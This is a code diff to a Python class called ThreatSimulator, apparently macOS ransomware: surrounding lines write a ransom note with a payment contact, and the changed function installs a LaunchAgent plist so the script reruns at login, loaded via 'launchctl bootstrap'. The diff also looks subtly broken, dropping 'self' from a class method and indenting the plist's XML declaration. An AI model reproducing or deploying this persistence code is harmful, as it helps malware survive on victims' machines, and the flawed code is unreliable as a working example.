@@ -80,34 +80,48 @@ class ThreatSimulator:
             f.write("For assistance or to initiate payment, contact us at:\n")
             f.write("Email: binaryninja@protonmail.com\n")
 
-    def add_launchd_persistence(self):
+    def add_launchd_persistence():
         try:
             plist_dir = os.path.join(os.path.expanduser("~/Library/LaunchAgents"))
             if not os.path.exists(plist_dir):
                 os.makedirs(plist_dir)
+    
             plist_path = os.path.join(plist_dir, "com.threat.plist")
             script_path = os.path.abspath(__file__)
+    
+            # Conteúdo do .plist
             plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.threat</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>Pun1sh3r</string>
-        <string>{script_path}</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-</dict>
-</plist>
-"""
+    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+    <plist version="1.0">
+    <dict>
+        <key>Label</key>
+        <string>com.threat</string>
+        <key>ProgramArguments</key>
+        <array>
+            <string>/usr/bin/python3</string>
+            <string>{script_path}</string>
+        </array>
+        <key>RunAtLoad</key>
+        <true/>
+    </dict>
+    </plist>
+    """
+            # Escreve o .plist
             with open(plist_path, 'w') as f:
                 f.write(plist_content)
-            subprocess.run(["launchctl", "load", plist_path], check=True)
-        except Exception:
-            pass
+    
+            # Permissão correta
+            os.chmod(plist_path, 0o644)
+    
+            # Carrega usando o novo método no macOS 15.1
+            subprocess.run(["launchctl", "bootstrap", f"gui/{os.getuid()}", plist_path], check=True)
+    
+            print(f"[+] Persistence added successfully at: {plist_path}")
+    
+        except subprocess.CalledProcessError as e:
+            print(f"[ERROR] Failed to load LaunchAgent: {e}")
+        except Exception as e:
+            print(f"[ERROR] General exception: {e}")
 
     def set_wallpaper_from_url(self, url):
         response = requests.get(url)
